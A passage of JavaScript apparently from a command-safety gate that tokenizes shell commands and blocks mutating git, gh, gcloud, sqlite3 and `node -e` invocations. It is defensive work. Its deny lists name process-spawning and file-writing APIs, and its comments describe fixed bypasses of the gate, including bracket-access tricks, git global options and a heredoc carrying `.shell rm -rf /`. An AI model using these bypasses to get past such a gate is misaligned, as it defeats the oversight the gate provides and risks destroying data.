  let inSingle = false;
  let inDouble = false;
  while (i < n) {
    const c = segment[i];
    const c2 = i + 1 < n ? segment[i + 1] : '';
    if (inSingle) { out += ' '; if (c === "'") inSingle = false; i++; continue; }
    if (inDouble) {
      if (c === '\\' && c2) { out += '  '; i += 2; continue; }
      out += ' '; if (c === '"') inDouble = false; i++; continue;
    }
    // Outside quotes, `\x` is a literal x (no quote state change) — keep it.
    if (c === '\\' && c2) { out += c + c2; i += 2; continue; }
    if (c === "'") { inSingle = true; out += ' '; i++; continue; }
    if (c === '"') { inDouble = true; out += ' '; i++; continue; }
    out += c; i++;
  }
  return out;
}

// blankPatternArgument(text, verb): for a grep/sed/awk (PATTERN_FIRST_VERBS)
// segment, its FIRST non-flag operand is a search PATTERN/script — DATA, not
// a command — so blank it (replace with spaces, preserving length/offsets)
// before running HEAVY_PATTERNS against the text. Fixes P2 fp b183a9f1bbd5:
// `git show <ref>:<path> | grep deploy` was misread as an executed "deploy"
// command because the pattern argument's own text was scanned like command
// text. Mirrors detectProtectedFileRead's skipNextOperand discipline (best-
// effort: does not special-case a SEPARATED flag value, e.g. `-A 5`, where
// the numeric operand would itself be (wrongly) treated as the pattern and
// blanked instead — same accepted limitation as the existing skipNextOperand
// logic above, not a new gap). Only ever narrows what is blanked (i.e. only
// ever ALLOWS more), never widens a block.
function blankPatternArgument(text, verb) {
  if (!verb || !PATTERN_FIRST_VERBS.has(verb)) return text;
  const tokenRe = /\S+/g;
  let m;
  let foundVerb = false;
  while ((m = tokenRe.exec(text))) {
    const tok = m[0];
    if (!foundVerb) {
      if (basename(tok).toLowerCase() === verb) foundVerb = true;
      continue;
    }
    if (tok.startsWith('-')) continue; // flag: skip, keep scanning for the pattern
    // First non-flag operand after the verb is the PATTERN/script -> blank it.
    const start = m.index;
    const end = start + tok.length;
    return text.slice(0, start) + ' '.repeat(tok.length) + text.slice(end);
  }
  return text;
}

// isSafeNodeEval(segment) -> true iff this segment is `node -e <code>` (or
// `--eval`) AND <code> contains no recognizable write/spawn API call. This is
// a GENERALIZATION of the existing quoted `-e "..."` LIGHT_EXCEPTIONS entry
// above (which only matches the exact `-e "..."` / `-e '...'` literal shape):
// this one tokenizes the segment (quote-aware, via tokenizeQuoted, so the
// payload's own spaces/quoting do not confuse it) and inspects the ACTUAL
// eval payload text for a closed, conservative deny-list of Node.js APIs that
// write, delete, or spawn a process (fs write/rm/rename/chmod/etc.,
// child_process spawn/exec/fork, or any reference to `child_process` at all).
// Deliberately CONSERVATIVE: this only ever WIDENS what is allowed (never
// narrows a block) — any payload it cannot confidently classify as safe
// (no recognized `-e`/`--eval` flag, or a payload containing ANY of the
// deny-listed substrings) returns false, leaving the normal heavy-command
// checks below to decide as before. Only the SPACED `-e <code>` / `--eval
// <code>` form is recognized (matching the existing quoted LIGHT_EXCEPTIONS
// entry's own scope) — an unrecognized shape is never exempted here, it is
// simply left for the pre-existing checks.
const NODE_EVAL_UNSAFE_RE = new RegExp(
  [
    '\\b(?:writeFile(?:Sync)?|appendFile(?:Sync)?|unlink(?:Sync)?|rm(?:Sync)?|rmdir(?:Sync)?|',
    'mkdir(?:Sync)?|rename(?:Sync)?|truncate(?:Sync)?|chmod(?:Sync)?|chown(?:Sync)?|',
    'symlink(?:Sync)?|copyFile(?:Sync)?|spawn(?:Sync)?|exec(?:Sync)?|execFile(?:Sync)?|fork)\\s*\\(|',
    'child_process',
  ].join(''),
  '',
);

// P2 fix (`node -e "require('fs')['writeFileSync']('x','y')"`): bracket
// member access (`obj['methodName']`) calls the SAME method as
// `obj.methodName(`, but hides the method NAME from NODE_EVAL_UNSAFE_RE's
// name-based `\bwriteFile(?:Sync)?\s*\(` matching (the char right after the
// name is `]`/`'`, never `(`) — a live-verified bypass of the deny-list
// above. Rather than try to enumerate every bracket-hiding shape, deny ANY
// bracket member access outright: `[` followed (optionally through
// whitespace) by a quote is never legitimate in a one-line eval payload
// safe enough to run inline, so "when in doubt, deny".
const NODE_EVAL_BRACKET_ACCESS_RE = /\[\s*['"]/;

// Small, closed allowlist of `fs` READ methods a safe `-e` payload may call.
// Everything else fs-namespaced is denied outright — this is a DEFAULT-DENY
// allowlist for the fs module specifically (not another deny-list item),
// so an fs method absent from BOTH the original NODE_EVAL_UNSAFE_RE deny-
// list and this allowlist (e.g. `fs.cpSync`, `fs.linkSync`,
// `fs.utimesSync`, `fs.createWriteStream`, `fs.watch`, `fs.opendirSync`)
// still denies, per "when in doubt, deny".
const NODE_FS_READ_ALLOWLIST = new Set([
  'readFileSync', 'readdirSync', 'statSync', 'existsSync', 'lstatSync',
]);
// Matches an ACTUAL fs API invocation — `fs.<method>(` or
// `require('fs').<method>(` — never an unrelated `.method(` call elsewhere
// in the payload that merely happens to follow some other object.
const NODE_FS_METHOD_CALL_RE =
  /(?:\brequire\(\s*['"]fs['"]\s*\)|\bfs)\s*\.\s*([A-Za-z_$][\w$]*)\s*\(/g;

function isSafeNodeEvalPayload(payload) {
  if (!payload) return false;
  if (NODE_EVAL_UNSAFE_RE.test(payload)) return false;
  if (NODE_EVAL_BRACKET_ACCESS_RE.test(payload)) return false;
  if (/\bchild_process\b/.test(payload)) return false;
  if (/\bfs\/promises\b/.test(payload)) return false;
  if (/\bprocess\s*\.\s*binding\s*\(/.test(payload)) return false;
  if (/\beval\s*\(/.test(payload)) return false;
  if (/\bFunction\s*\(/.test(payload)) return false;
  if (/\bimport\s*\(/.test(payload)) return false;
  NODE_FS_METHOD_CALL_RE.lastIndex = 0;
  let m;
  while ((m = NODE_FS_METHOD_CALL_RE.exec(payload))) {
    if (!NODE_FS_READ_ALLOWLIST.has(m[1])) return false;
  }
  return true;
}

function isSafeNodeEval(segment) {
  if (effectiveVerb(segment) !== 'node') return false;
  const tokens = tokenizeQuoted(segment);
  for (let i = 0; i < tokens.length; i++) {
    if (tokens[i] === '-e' || tokens[i] === '--eval') {
      const payload = i + 1 < tokens.length ? tokens[i + 1] : '';
      return isSafeNodeEvalPayload(payload);
    }
  }
  return false;
}

// isNodeDashEInvocation(segment) -> true iff this segment is a `node -e`/
// `node --eval` invocation (regardless of payload safety). Root-cause fix:
// `node` is NOT in HEAVY_VERBS and `node -e "..."` never matches the
// `\bnode\s+\S+\.(?:js|mjs|cjs)\b` HEAVY_PATTERN (there is no script FILE
// argument), so isSafeNodeEval()/isSafeNodeEvalPayload() above were
// previously dead code as far as isHeavySegment's BLOCK decision goes —
// an unsafe `-e` payload never got flagged heavy in the first place,
// regardless of what isSafeNodeEval returned. isHeavySegment now calls this
// after the isSafeNodeEval(segment) exemption check, so: safe payload ->
// exempted (returns false further up); unsafe/unknown payload -> this
// returns true -> BLOCKED.
function isNodeDashEInvocation(segment) {
  if (effectiveVerb(segment) !== 'node') return false;
  const tokens = tokenizeQuoted(segment);
  for (let i = 0; i < tokens.length; i++) {
    if (tokens[i] === '-e' || tokens[i] === '--eval') return true;
  }
  return false;
}

// isSafeGitFetch(segment) -> true iff this segment is `git fetch ...` AND
// carries no argument that can rewrite/delete a local ref: no `:` refspec
// (src:dst form), no leading `+` refspec (force-updates the dst even past a
// non-fast-forward), and none of --prune/-p/--prune-tags/--force/-f (which
// delete or force-overwrite local remote-tracking refs). P1 fix: the old
// LIGHT_EXCEPTIONS entry was a bare `\bgit\s+fetch\b` match, so it exempted
// ALL of those mutating forms too — `git fetch --prune origin` and
// `git fetch origin +refs/heads/*:refs/remotes/origin/*` both slipped through
// as "read-only". A `false` return here only means this specific exemption
// does not apply — `git fetch` still matches HEAVY_PATTERNS unconditionally
// (push|pull|fetch|clone) and is gated exactly as it was before the exemption
// existed, so this is fail-safe (never wrongly widens the block, only
// narrows the ALLOW).
const GIT_FETCH_DANGEROUS_FLAGS = new Set(['--prune', '-p', '--prune-tags', '--force', '-f']);

// git GLOBAL options (git's own top-level flags, recognized BEFORE the
// subcommand — never a subcommand's own flag) that gitSubcommandIndex must
// skip to find the real subcommand token. P1 fix: `git -c
// core.hooksPath=/tmp/x push --force origin main` and `git -C dir fetch
// +main:main` both slipped past every git check (the HEAVY_PATTERNS git
// regex, isSafeGitFetch) unflagged, because each one assumed the subcommand
// sits IMMEDIATELY after `git` with nothing in between — a global option
// broke that assumption and the whole invocation was never even classified
// as a git push/fetch at all.
const GIT_GLOBAL_VALUE_OPTS = new Set([
  '-c', '-C', '--namespace', '--super-prefix', '--exec-path',
  '--config-env', '--git-dir', '--work-tree',
]);
const GIT_GLOBAL_FLAG_OPTS = new Set([
  '--no-pager', '-p', '-P', '--paginate', '--bare',
  '--no-replace-objects', '--literal-pathspecs', '--no-optional-locks',
]);

// gitSubcommandIndex(tokens, gitIdx) -> index of the REAL git subcommand
// token (push/fetch/status/...), skipping any global options between `git`
// and the subcommand. Returns -1 if none is found. A value-taking global
// option (`-c`, `-C`, ...) consumes one extra token UNLESS its value is
// attached via `=` (`--git-dir=/x`). An unrecognized `-`-prefixed token
// before the subcommand is conservatively skipped by exactly one token too
// — git's own grammar never allows a subcommand-specific flag to appear
// before the subcommand name, so any leading `-` token here IS necessarily
// a global option, known or not.
function gitSubcommandIndex(tokens, gitIdx) {
  let idx = gitIdx + 1;
  while (idx < tokens.length) {
    const t = tokens[idx];
    if (!t.startsWith('-')) return idx;
    const eq = t.indexOf('=');
    const base = eq === -1 ? t : t.slice(0, eq);
    if (GIT_GLOBAL_VALUE_OPTS.has(base)) { idx += (eq === -1) ? 2 : 1; continue; }
    if (GIT_GLOBAL_FLAG_OPTS.has(t)) { idx++; continue; }
    idx++; // unknown global flag: skip just this one token (fail-safe)
  }
  return -1;
}

function isSafeGitFetch(segment) {
  if (effectiveVerb(segment) !== 'git') return false;
  const tokens = tokenizeQuoted(segment);
  const gitIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'git');
  if (gitIdx === -1) return false;
  const subIdx = gitSubcommandIndex(tokens, gitIdx);
  if (subIdx === -1 || (tokens[subIdx] || '').toLowerCase() !== 'fetch') return false;
  for (let i = subIdx + 1; i < tokens.length; i++) {
    const t = tokens[i];
    if (GIT_FETCH_DANGEROUS_FLAGS.has(t)) return false;
    if (t.startsWith('+')) return false;
    if (t.includes(':')) return false;
  }
  return true;
}

// isHeavyGitSegment(segment) -> true iff this segment's git invocation has a
// REAL subcommand (found via gitSubcommandIndex, so a global option in
// between `git` and the subcommand cannot hide it) of push/pull/clone
// (always heavy) or fetch without isSafeGitFetch's safety. This is the fix
// for the P1 bypass above: the plain-substring git HEAVY_PATTERN
// (`\bgit\s+(?:push|pull|fetch|clone)\b`) only matches when the subcommand
// is textually ADJACENT to `git`, so it never even sees a global-option-
// prefixed invocation — this check runs the same tokenized, option-aware
// parse used by isSafeGitFetch, so the two can never disagree about where
// the subcommand actually is. Gated on effectiveVerb(segment) === 'git'
// first (same discipline as isSafeGitFetch/isSafeSqliteReadonly/
// isSafeNodeEval below) so `git` appearing only as quoted DATA in an
// unrelated command (`echo "git push origin"`) is never misread as a real
// git invocation.
function isHeavyGitSegment(segment) {
  if (effectiveVerb(segment) !== 'git') return false;
  const tokens = tokenizeQuoted(segment);
  const gitIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'git');
  if (gitIdx === -1) return false;
  const subIdx = gitSubcommandIndex(tokens, gitIdx);
  if (subIdx === -1) return false;
  const sub = tokens[subIdx].toLowerCase();
  if (sub === 'push' || sub === 'pull' || sub === 'clone') return true;
  if (sub === 'fetch') return !isSafeGitFetch(segment);
  return false;
}

// isGitPushSegment(segment) -> true iff the real git subcommand is `push`.
// Used only to pick the block-reason wording (state-changing, not "heavy").
function isGitPushSegment(segment) {
  if (effectiveVerb(segment) !== 'git') return false;
  const tokens = tokenizeQuoted(segment);
  const gitIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'git');
  if (gitIdx === -1) return false;
  const subIdx = gitSubcommandIndex(tokens, gitIdx);
  return subIdx !== -1 && tokens[subIdx].toLowerCase() === 'push';
}

// isGitPullFetchSegment(segment) -> true for `git pull` / `git fetch` (they move
// refs/objects from a remote). Used ONLY to word the block reason; verdicts are
// unchanged (HEAVY_PATTERNS already flags both).
function isGitPullFetchSegment(segment) {
  if (effectiveVerb(segment) !== 'git') return false;
  const tokens = tokenizeQuoted(segment);
  const gitIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'git');
  if (gitIdx === -1) return false;
  const subIdx = gitSubcommandIndex(tokens, gitIdx);
  const sub = subIdx === -1 ? '' : tokens[subIdx].toLowerCase();
  return sub === 'pull' || sub === 'fetch';
}

// isSafeSqliteReadonly(segment) -> true iff this is a `sqlite3` invocation
// with `-readonly` present as its OWN argv token before the db path, and the
// SQL/args after the db path contain none of sqlite3's dangerous dot-commands
// (.shell/.system/.output/.once/.import/.save — several of these can write
// files or run arbitrary shell commands even on a read-only CONNECTION) or a
// standalone ATTACH (which opens a second, non-readonly database file).
// P2 fix: the old LIGHT_EXCEPTIONS entry was `/\bsqlite3\b[^\n]*\s-readonly\b/i`
// — a whole-string substring match, not an argv-position check, so it did not
// verify -readonly was an actual flag token (vs. e.g. part of a quoted SQL
// string) nor that no dangerous dot-command followed.
const SQLITE_DANGEROUS_RE = /(^|[\s;])\.(shell|system|output|once|import|save)\b|\bATTACH\b/i;

// isPipedIntoSegment(wholeCommand, segment) -> true iff `segment` (an exact,
// contiguous substring of wholeCommand — guaranteed by how splitSegments
// builds it: characters are copied straight from the source, never
// reordered) is immediately preceded, modulo whitespace, by a single `|`
// (not `||`) in the original command text. splitSegments CONSUMES the `|`
// operator itself when it flushes a segment (see its `if (c === '|')`
// branch), so the piped-into segment's own text never contains any trace of
// the pipe — this is the only way to recover that fact.
function isPipedIntoSegment(wholeCommand, segment) {
  if (typeof wholeCommand !== 'string' || typeof segment !== 'string') return false;
  const idx = wholeCommand.indexOf(segment);
  if (idx <= 0) return false;
  let i = idx - 1;
  while (i >= 0 && /\s/.test(wholeCommand[i])) i--;
  return i >= 0 && wholeCommand[i] === '|' && wholeCommand[i - 1] !== '|';
}

// isSafeSqliteReadonly(segment, wholeCommand) -> true iff this is a
// `sqlite3` invocation with `-readonly` present as its OWN argv token before
// the db path, the SQL/args after the db path contain none of sqlite3's
// dangerous dot-commands (see SQLITE_DANGEROUS_RE below), AND the
// invocation has NO stdin input at all (P1 fix below).
//
// P1 fix (`sqlite3 -readonly db.sqlite <<'EOF'` + a `.shell rm -rf /`
// heredoc BODY): the heredoc body is intentionally treated as inert DATA by
// splitSegments — it is never re-parsed as SQL/args, by design (see the
// heredoc-handling comment above splitSegments), so SQLITE_DANGEROUS_RE
// below can NEVER see a dangerous dot-command hidden in a heredoc body, a
// herestring, an input-file redirect, or piped stdin. The only sound fix is
// to deny the WHOLE exemption whenever this invocation has any stdin input
// at all: a heredoc (`<<`), herestring (`<<<`), input-file redirect (`<`),
// or being the receiving end of a shell pipe (`... | sqlite3 ...`) — the SQL
// text sqlite3 will actually execute is then not fully visible to this
// static check, so it is never eligible for the read-only exemption, full
// stop. The `<`/`<<`/`<<<` check runs against the QUOTE-NEUTRALIZED segment
// (neutralizeQuotedContents) so a literal `<` inside quoted SQL DATA
// (`"select 1 < 2"`) does not itself trigger this — only a real, unquoted
// shell redirect/heredoc/herestring token does.
function isSafeSqliteReadonly(segment, wholeCommand) {
  if (effectiveVerb(segment) !== 'sqlite3') return false;
  if (/</.test(neutralizeQuotedContents(segment))) return false;
  if (isPipedIntoSegment(wholeCommand, segment)) return false;
  const tokens = tokenizeQuoted(segment);
  const verbIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'sqlite3');
  if (verbIdx === -1) return false;
  let readonlyIdx = -1;
  let dbPathIdx = -1;
  for (let i = verbIdx + 1; i < tokens.length; i++) {
    if (tokens[i] === '-readonly') { readonlyIdx = i; continue; }
    if (tokens[i].startsWith('-')) continue; // some other flag
    dbPathIdx = i;
    break; // first non-flag token is the db path (sqlite3 [OPTS] FILE [SQL])
  }
  if (readonlyIdx === -1 || dbPathIdx === -1 || readonlyIdx > dbPathIdx) return false;
  const rest = tokens.slice(dbPathIdx + 1).join(' ');
  return !SQLITE_DANGEROUS_RE.test(rest);
}

// isReadOnlyCloudInspect(segment) -> true iff this is a gcloud/gh/kubectl
// invocation whose verb position is exactly describe|list|get|view (or, for
// gcloud only, the literal `logging read`), tokenized and matched by EXACT
// token equality — never a substring/\b match. P1 fix: the old regex
// `\b(?:gcloud|gh|kubectl)\s+(?:\S+\s+)*?(?:describe|list|get|view)\b` matched
// those words as a SUBSTRING anywhere later on the line, including inside an
// unrelated LATER compound token — `gcloud functions deploy list-users` and
// `kubectl delete pod get-worker-1` both matched (on `list`/`get` inside
// `list-users`/`get-worker-1`) even though the real, earlier verb was the
// mutating `deploy`/`delete`.
//   - gcloud: gcloudReadGrammar (0.113 P1) — `gcloud <group…> <verb>
//     [≤1 positional] [--k=v…]` with verb describe|list|get|view (or
//     `logging read`), the verb the LAST path word, no separated flag value,
//     and no mutating/secret-returning path word.
//   - gh / kubectl: no product-group prefix — the verb is exactly the FIRST
//     token after the binary.
// Belt + suspenders: a standalone mutating-verb token anywhere in the
// (non-exempt) argv rejects the exemption outright, even if a read-only verb
// also appears — a real gcloud/kubectl/gh invocation never combines the two.
// gcloudReadGrammar(rest, verbs) -> {verb, positional, flags} | null, where
// `rest` is the argv AFTER the gcloud binary. Enforces the ONLY accepted
// read shape: `gcloud <group…> <verb> [≤1 positional resource] [--k=v…]`.
//   - the verb is the LAST word of the command path: every leading non-flag
//     word up to it is a path word; after it at most ONE positional, then
//     only flags (a non-flag token after any flag is refused — that is how a
//     separated flag value such as `--zone read` used to pose as the verb);
//   - every flag is `--k=v` or a known boolean — a SEPARATE value is refused;
//   - path words are lowercase gcloud words and none may be a mutating/
//     secret-returning action (GCLOUD_REFUSED_PATH_RE), except `run` as the
//     product group in position 0 (`gcloud run services describe`).
// Hyphenated forms of the mutating actions (delete-access-config,
// create-token, update-container, reset-windows-password, …) are refused too.
const GCLOUD_REFUSED_PATH_RE = /^(?:access|ssh|scp|run|sign|print-.*|attach-.*|detach-.*|add-.*|set-.*|remove-.*|(?:reset|suspend|resume|publish|call|execute|decrypt|encrypt|delete|create|update|deploy)(?:-.*)?)$/;
const GCLOUD_BOOLEAN_FLAGS = new Set(['--quiet', '--uri']);
// Value-taking read flags that may carry a SEPARATED value (`--project foo`,
// `--limit 5`). Closed list: any other `--k v` stays refused (a separated
// value could otherwise pose as the verb or a second positional). The value
// must be one non-dash token. Only honoured when the caller passes
// sepValues=true, i.e. from isWholeCommandReadOnlyForm (the whole command is
// validated there; the per-segment exemptions keep the strict `--k=v` grammar). `--format`/`--filter` are NOT on the list: the
// narrow shape-B carve-out requires the `--format=<json|yaml|value(..)>` form.
const GCLOUD_VALUE_FLAGS = new Set([
  '--project', '--region', '--zone', '--location', '--limit', '--freshness',
  '--page-size', '--sort-by',
]);
function gcloudReadGrammar(rest, verbs, sepValues) {
  let i = 0;
  const path = [];
  while (i < rest.length && !rest[i].startsWith('-')) {
    const w = rest[i];
    if (verbs.has(w.toLowerCase())) break;
    path.push(w);
    i++;
  }
  if (i >= rest.length || rest[i].startsWith('-')) return null; // no verb in the path
  const verb = rest[i].toLowerCase();
  i++;
  if (!path.length) return null;
  for (let k = 0; k < path.length; k++) {
    const w = path[k];
    if (!/^[a-z][a-z0-9-]*$/.test(w)) return null;
    if (k === 0 && w === 'run') continue;
    if (GCLOUD_REFUSED_PATH_RE.test(w)) return null;
  }
  let positional = null;
  if (i < rest.length && !rest[i].startsWith('-')) { positional = rest[i]; i++; }
  const flags = [];
  for (; i < rest.length; i++) {
    const t = rest[i];
    if (!t.startsWith('--')) return null; // a second positional, a short flag, or a separated value
    if (/^--[a-z][a-z0-9-]*=/.test(t)) {
      if (/^--flags-file=/.test(t)) return null;
      flags.push(t);
      continue;
    }
    if (GCLOUD_BOOLEAN_FLAGS.has(t)) { flags.push(t); continue; }
    if (sepValues === true && GCLOUD_VALUE_FLAGS.has(t) && i + 1 < rest.length && !rest[i + 1].startsWith('-')) {
      flags.push(t + '=' + rest[i + 1]);
      i++;
      continue;
    }
    return null;
  }
  return { path, verb, positional, flags };
}

// stripGcloudStderrMerge(segment) -> the segment minus ONE trailing, unquoted,
// space-separated `2>&1` (stderr merged into the stdout pipe). That exact
// token is the ONLY redirection a gcloud read may carry: `>f`, `2>f`, `&>f`,
// `>&2`, `<f`, other fd dups, a quoted/escaped or mid-argv `2>&1` are left in
// place, so the unquoted-redirect check that follows still refuses them.
function stripGcloudStderrMerge(segment) {
  return segment.replace(/(^|[^\\])\s+2>&1\s*$/, '$1');
}

const CLOUD_BINARIES = new Set(['gcloud', 'gh', 'kubectl']);
const CLOUD_READONLY_VERBS = new Set(['describe', 'list', 'get', 'view']);
const GCLOUD_INSPECT_VERBS = new Set(['describe', 'list', 'get', 'view', 'read']);
const CLOUD_MUTATING_VERBS = new Set([
  'deploy', 'delete', 'create', 'update', 'set', 'patch', 'apply', 'rm',
  'remove', 'scale', 'rollout', 'run', 'exec', 'push', 'merge', 'close', 'edit',
]);
function isReadOnlyCloudInspect(segment) {
  const tokens = tokenizeQuoted(segment);
  const binIdx = tokens.findIndex((t) => CLOUD_BINARIES.has(basename(t).toLowerCase()));
  if (binIdx === -1) return false;
  const bin = basename(tokens[binIdx]).toLowerCase();
  const rest = tokens.slice(binIdx + 1);
  if (bin === 'gcloud') {
    // Same strict grammar as the narrow gcloud-read carve-out (0.113 P1):
    // a read verb found in ANY position (e.g. as a separated flag value,
    // `gcloud compute instances reset vm --zone list`) no longer qualifies.
    // Redirection: only a trailing `2>&1`; any other unquoted `>`/`<`
    // (including one glued to a flag value, `--format=json>f`) is refused.
    const stripped = stripGcloudStderrMerge(segment);
    if (hasUnquotedRedirectChar(stripped)) return false;
    const st = tokenizeQuoted(stripped);
    const sIdx = st.findIndex((t) => basename(t).toLowerCase() === 'gcloud');
    if (sIdx === -1) return false;
    const g = gcloudReadGrammar(st.slice(sIdx + 1), GCLOUD_INSPECT_VERBS);
    if (!g) return false;
    if (g.verb === 'read' && g.path[g.path.length - 1] !== 'logging') return false;
    return true;
  }
  // gh / kubectl: the verb is exactly the first token after the binary.
  const first = (rest[0] || '').toLowerCase();
  if (!CLOUD_READONLY_VERBS.has(first)) return false;
  for (let i = 1; i < rest.length; i++) {
    if (rest[i].startsWith('-')) continue;
    if (CLOUD_MUTATING_VERBS.has(rest[i].toLowerCase())) return false;
  }
  return true;
}

// isWholeCommandReadOnlyForm(command) -> true iff the COMPLETE command is
// exactly one read-only form, optionally piped into bounded non-executing sinks:
//   (a) `<firebase|gcloud|aws|az|kubectl|helm|terraform|pulumi|vercel|netlify|
//       heroku|serverless> --version|-V` (optionally a trailing `2>&1` /
//       `2>/dev/null`), or
//   (b) a gcloud describe/list/get/read under the strict grammar WITH separated
//       values for the closed GCLOUD_VALUE_FLAGS list.
// Unlike a per-segment light exception this approves nothing else on the line:
// every delimiter must be a pipe (no ;, &&, ||, &, newline, heredoc), there is
// no substitution/expansion/backslash, no redirection but one trailing `2>&1`
// (or `2>/dev/null` on a version query), and each pipe stage after the first is
// a closed stdin-only tail/head/wc/grep -c/-m N shape (isClosedSinkStage: no
// file operand, no unknown flag) — never sh/bash/xargs/eval/jq/tee.
const VERSION_CLI_RE = /^(?:firebase|gcloud|aws|az|kubectl|helm|terraform|pulumi|vercel|netlify|heroku|serverless)\s+(?:--version|-V)$/i;
function isWholeCommandReadOnlyForm(command) {
  const cmd = command.trim();
  if (!/^(?:firebase|gcloud|aws|az|kubectl|helm|terraform|pulumi|vercel|netlify|heroku|serverless)\s/i.test(cmd)) return false;
  if (/[\n\r]/.test(cmd) || hasShellExpansionAnywhere(cmd)) return false;
  const split = splitSegmentsDetailed(cmd);
  const segs = split.segments;
  if (!segs.length || split.delims[split.delims.length - 1] !== 'end') return false;
  for (let i = 0; i < split.delims.length - 1; i++) if (split.delims[i] !== '|') return false;
  const first = segs[0].trim();
  let ok = false;
  const vq = first.replace(/\s+2>(?:&1|\/dev\/null)$/, '');
  if (VERSION_CLI_RE.test(vq)) {
    ok = !hasUnquotedRedirectChar(vq);
  } else {
    const stripped = stripGcloudStderrMerge(first);
    if (!hasUnquotedRedirectChar(stripped)) {
      const st = tokenizeQuoted(stripped);
      if (st[0] === 'gcloud') {
        const g = gcloudReadGrammar(st.slice(1), GCLOUD_INSPECT_VERBS, true);
        ok = !!g && !(g.verb === 'read' && g.path[g.path.length - 1] !== 'logging');
      }
    }
  }
  if (!ok) return false;
  for (let i = 1; i < segs.length; i++) {
    if (!isClosedSinkStage(segs[i].trim())) return false;
  }
  return true;
}

// isClosedSinkStage(segment) -> true iff the stage is EXACTLY one of the closed
// stdin-only sink shapes (no file operand, no unknown flag; only used by
// isWholeCommandReadOnlyForm AND isBoundedSinkSegment, so every sink that
// decides an allow uses this one grammar):
//   head|tail            [no args | -N | -n N | -nN | -n +N | -c N | -cN]   (numeric only)
//   wc                   [-l|-c|-w|-m ...], no operands
//   grep [-E|-F|-G|-i|-v|-w|-x|-n|-H|-h|-o|-a]... (-c | -m N) PATTERN   (one pattern token, no file operand)
function isClosedSinkStage(segment) {
  if (hasUnquotedRedirectChar(segment) || hasShellExpansionAnywhere(segment)) return false;
  return closedSinkTokens(tokenizeQuoted(segment));
}
function closedSinkTokens(t) {
  if (!t.length) return false;
  const rest = t.slice(1);
  if (t[0] === 'head' || t[0] === 'tail') {
    if (rest.length === 0) return true;
    if (rest.length === 1) return /^-(?:\d+|[nc]\+?\d+)$/.test(rest[0]);
    if (rest.length === 2) return (rest[0] === '-n' || rest[0] === '-c') && /^\+?\d+$/.test(rest[1]);
    return false;
  }
  if (t[0] === 'wc') return rest.every((a) => /^-[lcwm]$/.test(a));
  if (t[0] === 'grep') {
    // Bounded by -c or -m N; match-mode flags from a closed set; exactly one
    // non-flag operand (the pattern). No -f/-e/-r/-R/--include/--file: nothing
    // that names a file or a second pattern source.
    let bounded = false;
    let pattern = 0;
    for (let i = 0; i < rest.length; i++) {
      const a = rest[i];
      if (a === '-c') { bounded = true; continue; }
      if (a === '-m') {
        if (!/^\d+$/.test(rest[i + 1] || '')) return false;
        bounded = true; i++; continue;
      }
      if (/^-[EFGivwxnHhoa]+$/.test(a)) continue;
      if (a.startsWith('-')) return false;
      pattern++;
    }
    return bounded && pattern === 1;
  }
  return false;
}

// P2 fix: `gh` mutating subcommands were never classified heavy at all — `gh`
// is not a HEAVY_VERB and no HEAVY_PATTERN mentions it, so isReadOnlyCloudInspect
// (an EXEMPTION check, only ever relevant once something is already flagged
// heavy) never mattered: `gh pr merge`, `gh issue delete`, `gh release
// upload`, etc. all sailed through unflagged. GH_MUTATING_SUBCOMMANDS +
// isHeavyGhSegment below are the actual DETECTOR this needed; read-only verbs
// (view/list/status/diff/checks) and `gh run watch|view` are simply absent
// from every set here, so they fall through to "not heavy" by construction —
// no separate allowlist regex needed.
const GH_MUTATING_SUBCOMMANDS = {
  pr: new Set(['merge', 'close', 'edit', 'create', 'review']),
  issue: new Set(['create', 'close', 'delete', 'edit']),
  release: new Set(['create', 'delete', 'edit', 'upload']),
  repo: new Set(['delete', 'edit']),
  secret: new Set(['set', 'delete']),
};
const GH_API_MUTATING_METHODS = new Set(['POST', 'PATCH', 'PUT', 'DELETE']);

// isReadOnlyGhGraphql(tokens, ghIdx) -> true only for a provably read-only
// `gh api graphql` call (closed read set; anything unknown => false):
// endpoint `graphql`|`/graphql`, fields only as separated -f/-F/--field/
// --raw-field pairs with exactly one `query=` whose value is empty or starts
// with `{` / `query` + [space { (], and has no `$`, backtick, leading `@` or
// `mutation`; every other flag must be in the read set below.
const GH_GQL_VALUE_FLAGS = new Set(['--jq', '-q', '-H', '--header', '--hostname', '--cache', '-t', '--template']);
const GH_GQL_BOOL_FLAGS = new Set(['--paginate', '--slurp', '--silent', '-i', '--include', '--verbose']);
const GH_GQL_FIELD_FLAGS = new Set(['-f', '-F', '--field', '--raw-field']);
function isReadOnlyGhGraphql(tokens, ghIdx) {
  if (!/^\/?graphql$/i.test(tokens[ghIdx + 2] || '')) return false;
  let queries = 0;
  for (let i = ghIdx + 3; i < tokens.length; i++) {
    const t = tokens[i];
    if (GH_GQL_BOOL_FLAGS.has(t)) continue;
    if (GH_GQL_VALUE_FLAGS.has(t)) {
      if (i + 1 >= tokens.length) return false;
      i++;
      continue;
    }
    if (GH_GQL_FIELD_FLAGS.has(t)) {
      if (i + 1 >= tokens.length) return false;
      const v = tokens[++i];
      const eq = v.indexOf('=');
      if (eq === -1) return false;
      if (v.slice(0, eq) !== 'query') continue;
      const q = v.slice(eq + 1);
      if (/[$`]/.test(q) || q.startsWith('@') || /\bmutation\b/i.test(q)) return false;
      const qt = q.trim();
      if (qt !== '' && !qt.startsWith('{') && !/^query[\s{(]/.test(qt)) return false;
      queries++;
      continue;
    }
    return false;
  }
  return queries === 1;
}

// isHeavyGhSegment(segment) -> true iff this is a `gh` invocation of a
// mutating subcommand: pr merge/close/edit/create/review, issue
// create/close/delete/edit, release create/delete/edit/upload, repo
// delete/edit, secret set/delete, `gh workflow run`, or `gh api` used with
// -X/--method POST|PATCH|PUT|DELETE or any -f/-F/--field/--raw-field data
// argument (all of which mutate via the REST/GraphQL API regardless of
// method). Gated on effectiveVerb(segment) === 'gh' first, same discipline
// as isHeavyGitSegment, so `gh` appearing only as quoted DATA is never
// misread as a real invocation.
function isHeavyGhSegment(segment, command) {
  if (effectiveVerb(segment) !== 'gh') return false;
  const tokens = tokenizeQuoted(segment);
  const ghIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'gh');
  if (ghIdx === -1) return false;
  const group = (tokens[ghIdx + 1] || '').toLowerCase();
  const sub = (tokens[ghIdx + 2] || '').toLowerCase();
